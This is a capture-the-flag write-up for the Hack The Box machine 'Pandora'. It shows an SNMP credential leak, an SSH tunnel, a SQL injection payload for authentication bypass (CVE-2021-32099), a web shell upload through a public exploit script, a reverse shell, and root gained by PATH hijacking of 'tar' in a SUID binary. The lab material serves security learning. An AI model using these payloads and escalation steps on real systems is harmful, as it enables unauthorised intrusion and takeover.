
### Initial access
Nmap
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

UDPX
```
┌──(kali㉿kali)-[~/HTB/Pandora]
└─$ udpx -t $target

        __  ______  ____ _  __
       / / / / __ \/ __ \ |/ /
      / / / / / / / /_/ /   / 
     / /_/ / /_/ / ____/   |  
     \____/_____/_/   /_/|_|  
         v1.0.7, by @nullt3r

2026/09/15 05:49:02 [+] Starting UDP scan on 1 target(s)
2026/09/15 05:49:10 [*] 10.129.39.205:161 (snmp)
2026/09/15 05:49:22 [+] Scan completed

```
SNMP
```
┌──(kali㉿kali)-[~/HTB/Pandora]
└─$ snmpwalk -v2c -c public $target 1.3.6.1.2.1.1 
SNMPv2-MIB::sysDescr.0 = STRING: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (77631) 0:12:56.31
SNMPv2-MIB::sysContact.0 = STRING: Daniel
SNMPv2-MIB::sysName.0 = STRING: pandora
SNMPv2-MIB::sysLocation.0 = STRING: Mississippi
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.8 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (27) 0:00:00.27
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (27) 0:00:00.27

```

User `Daniel` 


```bash {28}
HOST-RESOURCES-MIB::hrSWRunParameters.1 = STRING: "maybe-ubiquity"
HOST-RESOURCES-MIB::hrSWRunParameters.662 = STRING: "-d -s"
HOST-RESOURCES-MIB::hrSWRunParameters.670 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.671 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.686 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.695 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.696 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.715 = STRING: "-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
HOST-RESOURCES-MIB::hrSWRunParameters.729 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.730 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
HOST-RESOURCES-MIB::hrSWRunParameters.735 = STRING: "--foreground"
HOST-RESOURCES-MIB::hrSWRunParameters.738 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
HOST-RESOURCES-MIB::hrSWRunParameters.739 = STRING: "-n -iNONE"
HOST-RESOURCES-MIB::hrSWRunParameters.740 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.742 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.831 = STRING: "--no-debug"
HOST-RESOURCES-MIB::hrSWRunParameters.873 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.926 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.937 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.938 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.942 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.952 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
HOST-RESOURCES-MIB::hrSWRunParameters.955 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.956 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.961 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.1036 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1039 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1153 = STRING: "-u daniel -p HotelBabylon23"
HOST-RESOURCES-MIB::hrSWRunParameters.1373 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1399 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1406 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.1409 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.2307 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.2445 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.2919 = STRING: "-k start"

```
We see cred `daniel:HotelBabylon23`
Test it with ssh and it work
```bash {55}
┌──(kali㉿kali)-[~/HTB/Pandora]
└─$ ssh daniel@10.129.39.205                              
The authenticity of host '10.129.39.205 (10.129.39.205)' can't be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.39.205' (ED25519) to the list of known hosts.
daniel@10.129.39.205's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 15 Sep 09:54:15 UTC 2026

  System load:           0.0
  Usage of /:            63.3% of 4.87GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.39.205
  IPv6 address for eth0: dead:beef::250:56ff:feb9:edc5

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$ 
daniel@pandora:/home$ ls                                                                                                                                                                     
daniel  matt


daniel@pandora:/home$ find / -type f -perm -04000 -ls 2>/dev/null                                                                                                                            
   264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo                                                                                                        
   265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec
   267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
   262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
   267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
   264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
   262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup


```

We see suid with user is root and group is matt
### Lateral Movement
Run pspy64
```
2026/09/15 09:58:37 CMD: UID=0    PID=1153   | /usr/bin/host_check -u daniel -p HotelBabylon23 

```
Linpeas
```
╔══════════╣ Searching docker files (limit 70) (T1613)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/index.html                                                                                                                                        
-rw-r--r-- 1 matt matt 1263 Jan  3  2020 /var/www/pandora/pandora_console/Dockerfile                                                                                                                                                        
</VirtualHost>
lrwxrwxrwx 1 root root 31 Dec  3  2021 /etc/apache2/sites-enabled/pandora.conf -> ../sites-available/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
╔══════════╣ Searching mysql credentials and exec (T1552.001)
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                                                   
Found readable /etc/mysql/my.cnf
[mysqld]
sql_mode=NO_ENGINE_SUBSTITUTION
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/


```
we see subdomain is running in matt priv and at local ip so  let exploit it 
```
┌──(kali㉿kali)-[~/HTB/Pandora]
└─$ ssh -L 5555:127.0.0.1:80 daniel@10.129.39.205

```
After check we have cve in the web https://github.com/akr3ch/CVE-2021-32099 (We seach authentication bypass cve of that app it will appear)
```
http://pandora.pandora.htb:5555/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271

```

After using sqli to get session from database we have admin access let get PHPSESSION and run webshell 
```
──(kali㉿kali)-[~/HTB/Pandora]
└─$ searchsploit pandora 7.0NG.742                                         
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)                                                                                       | php/webapps/50961.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


┌──(kali㉿kali)-[~/HTB/Pandora]
└─$ python3  50961.py -t pandora.pandora.htb 5555  -p '2ii1vj6q7kr1u7k1ue9f7idr6c'

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution
OPTIONS: Web Shell Mode
PHPSESS: 2ii1vj6q7kr1u7k1ue9f7idr6c
WEBFILE: unicord.php
WEBSITE: http://pandora.pandora.htb:5555/pandora_console
EXPLOIT: Connected to website! Status Code: 200
EXPLOIT: Logged into Pandora FMS!
EXPLOIT: Web shell uploaded!
SUCCESS: Web shell available at: http://pandora.pandora.htb:5555/pandora_console/images/unicord.php?cmd=whoami 

```

We got reverseshell
```
┌──(kali㉿kali)-[~/HTB/Pandora]
└─$ penelope --oscp-safe --no-log -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => pandora 10.129.39.205 Linux-x86_64 👤 matt(1000) 😍 Session ID <1>
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
matt@pandora:/var/www/pandora/pandora_console/images$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)

```
### Priv escalation

Come back with SUID
```
matt@pandora:/home/matt$ ls -ls /usr/bin/pandora_backup
20 -rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup

```

Read the binary
```bash {55-65}
matt@pandora:/home/matt$ cat /usr/bin/pandora_backup | grep -a -o -E '[a-zA-Z0-9_\-\/]{2,}'
ELF
td
td
td
/lib64/ld
linux
x86
64
so
GNU
qt
G7
H9
GNU
puts
setreuid
system
getuid
geteuid
__cxa_finalize
__libc_start_main
libc
so
GLIBC_2
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
r/
PTL
H9
Y/
5R/
u/UH
UH
SH
AWL
AVI
AUI
ATA
UH
SL
H9
A\A
A_
PandoraFMS
Backup
Utility
Now
attempting
to
backup
PandoraFMS
client
tar
cvf
/root/
backup/pandora
backup
tar
gz
/var/www/pandora/pandora_console/
Backup
failed
Check
your
permissions
Backup
successful
Terminating
program
zR
zR
8A
0A
GCC
Debian
10
10
20210110
crtstuff
deregister_tm_clones
__do_global_dtors_aux
completed
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts
GLIBC_2
_edata
getuid
GLIBC_2
system
GLIBC_2
geteuid
GLIBC_2
__libc_start_main
GLIBC_2
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
setreuid
GLIBC_2
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize
GLIBC_2
symtab
strtab
shstrtab
interp
note
gnu
build
id
note
ABI
tag
gnu
hash
dynsym
dynstr
gnu
version
gnu
version_r
rela
dyn
rela
plt
init
plt
got
text
fini
rodata
eh_frame_hdr
eh_frame
init_array
fini_array
dynamic
got
plt
data
bss
comment
P0
P0
x0

```

We see `tar` dont use absolute path we can patch hijjaking it but for it to work we need ssh session because in revshell it will take out our suid.

```
matt@pandora:/home/matt$ echo 'chmod +s /bin/bash' >> /tmp/tar
matt@pandora:/home/matt$ chmod +x /tmp/tar
matt@pandora:/home/matt$ export PATH=/tmp:$PATH
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
matt@pandora:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash


```